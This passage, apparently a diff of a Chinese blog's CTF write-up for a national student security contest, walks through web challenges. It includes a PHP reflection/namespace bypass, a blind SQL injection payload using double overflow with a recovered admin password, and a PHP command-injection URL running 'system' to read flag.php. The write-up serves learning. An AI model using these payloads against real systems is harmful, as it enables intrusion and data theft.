&quot;too&#123;young-too-simple&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">如果正确的话，我们的SDK会返回flag。</span><br><span class="line"></span><br><span class="line">PS: 为了节省各位大佬的时间，特注明</span><br><span class="line">	1.此处函数return值并不是真正的flag，和真正的flag没有关系。</span><br><span class="line">	2.此处调用的sha1函数为PHP语言内建的hash函数。(http:&#x2F;&#x2F;php.net&#x2F;manual&#x2F;zh&#x2F;function.sha1.php)</span><br><span class="line">	3.您无须尝试本地解码或本地运行sdk.php，它被预期在指定服务器环境上运行。</span><br><span class="line">	4.几乎大部分源码内都有一定的hint，如果您是通过扫描目录发现本文件的，您可能还有很长的路要走。</span><br></pre></td></tr></table></figure>
+<p><img src="./6.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="backup-zip中文件"><a href="#backup-zip中文件" class="headerlink" title="backup.zip中文件"></a>backup.zip中文件</h2><pre><code class="hljs php">我们的SDK通过如下SHA1算法验证key是否正确:
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span><span class="hljs-params">($key)</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">if</span> (sha1($key) === <span class="hljs-keyword">$this</span>-&gt;getHash()) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">"too&#123;young-too-simple&#125;"</span>;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
+&#125;
+
+如果正确的话，我们的SDK会返回flag。
+
+PS: 为了节省各位大佬的时间，特注明
+	<span class="hljs-number">1.</span>此处函数<span class="hljs-keyword">return</span>值并不是真正的flag，和真正的flag没有关系。
+	<span class="hljs-number">2.</span>此处调用的sha1函数为PHP语言内建的hash函数。(http:<span class="hljs-comment">//php.net/manual/zh/function.sha1.php)</span>
+	<span class="hljs-number">3.</span>您无须尝试本地解码或本地运行sdk.php，它被预期在指定服务器环境上运行。
+	<span class="hljs-number">4.</span>几乎大部分源码内都有一定的hint，如果您是通过扫描目录发现本文件的，您可能还有很长的路要走。</code></pre>
 <h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>通过flag.php得到Flag的要求是满足<code>Verify()</code>方法中的<code>sha1()</code>判断。访问/ctf/目录看到sdk.php，文件相当于连接远程sdk的一个接口文件。题目提示可以想到考点是<code>refelect namespace</code></p>
-<p><img src="./7.png" alt=""></p>
+<p><img src="./7.png" srcset="/img/loading.gif" alt=""></p>
 <h2 id="PHP-SDK使用例子："><a href="#PHP-SDK使用例子：" class="headerlink" title="PHP SDK使用例子："></a>PHP SDK使用例子：</h2><p><a href="https://help.aliyun.com/document_detail/70057.html" target="_blank" rel="noopener">https://help.aliyun.com/document_detail/70057.html</a></p>
 <h2 id="refelect-namespace"><a href="#refelect-namespace" class="headerlink" title="refelect namespace"></a>refelect namespace</h2><p>在upload目录下构造文件，使用<code>namespace interesting</code>引入模块，<br>重写<code>sha1()</code>方法，类优先调用本命名空间的同名函数优。</p>
 <p>将如下代码写入<strong>app/flag.php</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">interesting</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sha1</span><span class="params">($var)</span> </span>&#123; <span class="comment">// 调用类的私有、保护方法    </span></span><br><span class="line">$class = <span class="keyword">new</span> \ReflectionClass(<span class="string">'interesting\FlagSDK'</span>);    </span><br><span class="line">$method = $class-&gt;getMethod(<span class="string">'getHash'</span>);    </span><br><span class="line">$method-&gt;setAccessible(<span class="keyword">true</span>);    </span><br><span class="line">$instance = $class-&gt;newInstance();    </span><br><span class="line"><span class="keyword">return</span> $method-&gt;invoke($instance);&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">interesting</span>;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sha1</span><span class="hljs-params">($var)</span> </span>&#123; <span class="hljs-comment">// 调用类的私有、保护方法    </span>
+$class = <span class="hljs-keyword">new</span> \ReflectionClass(<span class="hljs-string">'interesting\FlagSDK'</span>);    
+$method = $class-&gt;getMethod(<span class="hljs-string">'getHash'</span>);    
+$method-&gt;setAccessible(<span class="hljs-keyword">true</span>);    
+$instance = $class-&gt;newInstance();    
+<span class="hljs-keyword">return</span> $method-&gt;invoke($instance);&#125;</code></pre>
 
 <h2 id="DEMO实验"><a href="#DEMO实验" class="headerlink" title="DEMO实验"></a>DEMO实验</h2><p>可以发现<code>sha1()</code>算法执行之后与<code>send()</code>方法相同<code>md5</code>相同<br>值得注意的是这里<code>sha1</code>需要定义命名空间否则无法创建，会与php内置的方法冲突</p>
-<p><img src="./8.png" alt=""></p>
+<p><img src="./8.png" srcset="/img/loading.gif" alt=""></p>
 <h1 id="世界上最简单的sql"><a href="#世界上最简单的sql" class="headerlink" title="世界上最简单的sql"></a>世界上最简单的sql</h1><p>过滤：<code>| or sleep if benchmark case elt</code></p>
 <p>题目要求输入帐号密码</p>
 <p><strong>输入过滤字符或者单引号，提示数据库链接失败，但是仍然无法使用报错语句注入。</strong><br><strong>输入正确字符，提示登录失败！！！</strong></p>
 <h2 id="DOUBLE型溢出"><a href="#DOUBLE型溢出" class="headerlink" title="DOUBLE型溢出"></a>DOUBLE型溢出</h2><p>power函数当第二个参数足够大，发生<code>Double</code>溢出，<code>mysql</code>报错。</p>
-<p><img src="./9.png" alt=""></p>
+<p><img src="./9.png" srcset="/img/loading.gif" alt=""></p>
 <p><code>round()</code>中添加判断语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">为真&#x3D;&gt;溢出</span><br><span class="line">为假&#x3D;&gt;语法正确，返回1</span><br></pre></td></tr></table></figure>
-<p><img src="./10.png" alt=""></p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:&#39; ^ 1 and power((select version()),round(substr((select &#96;2&#96; from (select 1,2 union select * from user)a limit 1,1),%d,1)&#x3D;&#39;%s&#39;)*1000)#&quot;%(i,j)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs coq">为真=&gt;溢出
+为假=&gt;语法正确，返回<span class="hljs-number">1</span></code></pre>
+<p><img src="./10.png" srcset="/img/loading.gif" alt=""></p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code class="hljs sql">Payload:' ^ 1 and power((<span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>()),<span class="hljs-keyword">round</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-string">`2`</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>)a <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),%d,<span class="hljs-number">1</span>)=<span class="hljs-string">'%s'</span>)*<span class="hljs-number">1000</span>)<span class="hljs-comment">#"%(i,j)</span></code></pre>
 <p>写脚本，爆破出数据出数据库名字，但是由于<code>or</code>过滤，无法使用<code>information</code>依次取表和列。</p>
 <h2 id="无列名取值"><a href="#无列名取值" class="headerlink" title="无列名取值"></a>无列名取值</h2><p><strong>select /<code>1/</code> from (select 1,2,3 union select * from users)a;</strong></p>
-<p><img src="./11.png" alt=""></p>
+<p><img src="./11.png" srcset="/img/loading.gif" alt=""></p>
 <p>使用<code>select load_file(‘...’);</code>爆破文件无果，登录无果，脚本使用字符判断会忽略大小写问题，转用ASCII爆破。得到<code>F1AG@1s-at_/fll1llag_h3r3</code>。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin	</span><br><span class="line">password:F1AG@1s-at_&#x2F;fll1llag_h3r3</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs less"><span class="hljs-attribute">username</span>:admin	
+<span class="hljs-attribute">password</span>:F1AG<span class="hljs-variable">@1s-at_</span>/fll1llag_h3r3</code></pre>
 <p>登录成功之后，发现需要构造mysql伪服务器，读取文件。题目关了没复现完</p>
-<h1 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h1><p><img src="./12.png" alt=""></p>
-<p><strong>环境:php&gt;7.0</strong><br><img src="./13.png" alt=""></p>
+<h1 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h1><p><img src="./12.png" srcset="/img/loading.gif" alt=""></p>
+<p><strong>环境:php&gt;7.0</strong><br><img src="./13.png" srcset="/img/loading.gif" alt=""></p>
 <p><code>http://127.0.0.1/math.php?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=tac%20flag.php</code><br><strong>tac的功能是将文件从最后一行开始倒过来将内容数据输出到屏幕上</strong></p>
-<p>payload等价：<code>$pi=_GET;($_GET[pi])($_GET[abs])</code><br><img src="./14.png" alt=""></p>
+<p>payload等价：<code>$pi=_GET;($_GET[pi])($_GET[abs])</code><br><img src="./14.png" srcset="/img/loading.gif" alt=""></p>
 <h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/4906#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/4906#toc-10</a><br><a href="https://xz.aliyun.com/t/4904#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/4904#toc-3</a></p>
 
-  </div>
-</article>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/04/28/fafuCtf-WEB%E9%A2%98%E8%A7%A3/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">fafuCtf_WEB题解</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/">
+                        <span class="hidden-mobile">HDwiki6.0_sql盲注</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    <section id="comments" class="comments">
-      <style>
-        .comments{margin:30px;padding:10px;background:#fff}
-        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
-      </style>
-      <div class="valine_comment"></div>
-<!--载入js，在</body>之前插入即可-->
-<!--Leancloud 操作库:-->
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<!--Valine 的核心代码库-->
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-  new Valine({
-      el: '.valine_comment',
-      app_id: 'iQQPWYCs248kHd506mp50DKg-gzGzoHsz',
-      app_key: 'oUxg0tEGmlJSq2r3FuvEXgr4',
-      placeholder: '这里留言。。',
-      notify: 'true',
-      verify: 'true',
-      visitor: true
-    });
-</script>
-
-    </section>
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
+            
+          </article>
+        </div>
+      </div>
     </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
 
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JustSoso"><span class="toc-number">2.</span> <span class="toc-text">JustSoso</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RefSpace"><span class="toc-number">3.</span> <span class="toc-text">RefSpace</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息搜集"><span class="toc-number">3.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Up10aD-php"><span class="toc-number">3.2.</span> <span class="toc-text">Up10aD.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phar一句话木马构造"><span class="toc-number">3.3.</span> <span class="toc-text">phar一句话木马构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#backup-zip中文件"><span class="toc-number">3.4.</span> <span class="toc-text">backup.zip中文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-php"><span class="toc-number">3.5.</span> <span class="toc-text">flag.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-SDK使用例子："><span class="toc-number">3.6.</span> <span class="toc-text">PHP SDK使用例子：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#refelect-namespace"><span class="toc-number">3.7.</span> <span class="toc-text">refelect namespace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DEMO实验"><span class="toc-number">3.8.</span> <span class="toc-text">DEMO实验</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#世界上最简单的sql"><span class="toc-number">4.</span> <span class="toc-text">世界上最简单的sql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#DOUBLE型溢出"><span class="toc-number">4.1.</span> <span class="toc-text">DOUBLE型溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">4.2.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#无列名取值"><span class="toc-number">4.3.</span> <span class="toc-text">无列名取值</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#love-math"><span class="toc-number">5.</span> <span class="toc-text">love_math</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&text=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&title=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&is_video=false&description=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=第12届全国大学生信息安全竞赛_WEB&body=Check out this article: http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&title=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&title=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&title=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&title=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&name=第12届全国大学生信息安全竞赛_WEB&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/&t=第12届全国大学生信息安全竞赛_WEB" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
+      </div>
+    
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
+<!-- Custom -->
+
+
     
-    
-    2016-2020
-    osword
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">首页</a></li>
-         
-          <li><a href="/about/">关于</a></li>
-         
-          <li><a href="/archives/">归档</a></li>
-         
-          <li><a href="/projects_url">项目</a></li>
-        
-      </ul>
-    </nav>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
   </div>
 </footer>
 
-    </div>
-    <!-- styles -->
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
 
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<!-- Plugins -->
 
-
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
-
-
-    <!-- jquery -->
-
-<script src="/lib/jquery/jquery.min.js"></script>
-
-
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-
-<!-- clipboard -->
 
   
-<script src="/lib/clipboard/clipboard.min.js"></script>
+    <script  src="/js/lazyload.js" ></script>
+  
 
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+
+
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功!");
-      e.clearSelection();
-    })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "第12届全国大学生信息安全竞赛_WEB&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 </body>
